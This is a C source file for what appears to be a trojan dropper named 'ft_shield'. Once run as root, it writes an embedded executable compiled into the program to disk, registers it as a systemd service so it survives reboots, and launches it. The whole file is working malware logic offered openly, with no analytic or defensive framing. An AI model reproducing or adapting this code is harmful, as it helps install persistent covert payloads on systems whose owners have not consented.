#include "ft_shield.h"

#ifndef TROEXE
# error "-DTROEXE=... is required to compile this file"
#endif

int	create_trojan(void)
{
	int	fd;

	fd = creat(TROLOC, 0755);
	if (fd < 0)
	{
		perror("open");
		return (EXIT_FAILURE);
	}
	if (write(fd, TROEXE, sizeof(TROEXE)) < 0)
	{
		close(fd);
		perror("open");
		return (EXIT_FAILURE);
	}
	close(fd);
	create_systemd_service();
	execve(TROLOC, (char **){}, environ);
	return (EXIT_FAILURE);
}

int	main(void)
{
	if (getuid())
	{
		dprintf(STDERR_FILENO, "not enough permissions...\n");
		return (EXIT_FAILURE);
	}
	printf("%s\n", LOGIN);
	return (create_trojan());
}
